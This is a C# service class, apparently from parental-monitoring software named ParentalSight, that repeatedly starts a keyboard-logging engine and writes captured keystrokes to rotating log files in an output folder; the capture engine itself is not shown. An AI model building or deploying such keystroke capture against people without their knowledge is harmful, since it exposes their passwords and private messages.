namespace ParentalSight.Core.Keylogger
{
    using Microsoft.Extensions.Logging;
    using ParentalSight;
    using ParentalSight.Common.Builders;
    using ParentalSight.Core.Screenshot;
    using ParentalSight.Keylogger.Engines;
    using System;
    using System.Collections.Generic;
    using System.IO;
    using System.Text;
    using System.Threading;
    using System.Threading.Tasks;

    internal class KeyloggerService : IKeyloggerService
    {
        private readonly IKeyloggerOptions _options;
        private readonly ILogger<KeyloggerService> _logger;

        public KeyloggerService(IKeyloggerOptions options, ILogger<KeyloggerService> logger)
        {
            _options = options;
            _logger = logger;
        }

        public async Task StartAsync(CancellationToken stoppingToken)
        {
            // TODO: Move to central point which also includes ther logged in users name
            if (!Directory.Exists(_options.OutputPath))
            {
                Directory.CreateDirectory(_options.OutputPath);
            }

            while (!stoppingToken.IsCancellationRequested)
            {
                _logger.LogInformation("Worker running at: {time}", DateTimeOffset.Now);

                var log = new FilenameBuilder()
                    .WithPrefix("logger-")
                    .WithExtension("log")
                    .Build();

                var filepath = Path.Combine(_options.OutputPath, log);
                var engine = new KeyboardLoggerEngine(filepath);

                var loggerFileWriteExpiration = DateTime.Now.AddMilliseconds(_options.LogRotationInMilliseconds);
                engine.StartKeylogger(loggerFileWriteExpiration);
            }
        }
    }
}
